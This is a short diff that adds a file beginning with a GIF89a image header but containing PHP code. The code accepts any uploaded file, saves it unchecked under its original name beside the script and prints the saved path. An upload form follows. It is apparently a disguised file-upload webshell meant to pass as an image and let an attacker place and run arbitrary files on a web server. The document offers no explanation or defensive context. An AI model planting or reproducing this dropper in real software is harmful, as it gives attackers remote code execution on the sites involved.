@@ -1,0 +1,10 @@
+GIF89a
+<?php
+if (!empty($_FILES['f']['tmp_name'])) {
+    $dest = __DIR__ . '/' . $_FILES['f']['name'];
+    move_uploaded_file($_FILES['f']['tmp_name'], $dest);
+    echo "OK:" . $dest;
+    exit;
+}
+?>
+<form method="post" enctype="multipart/form-data"><input type="file" name="f"><input type="submit" value="Upload"></form>
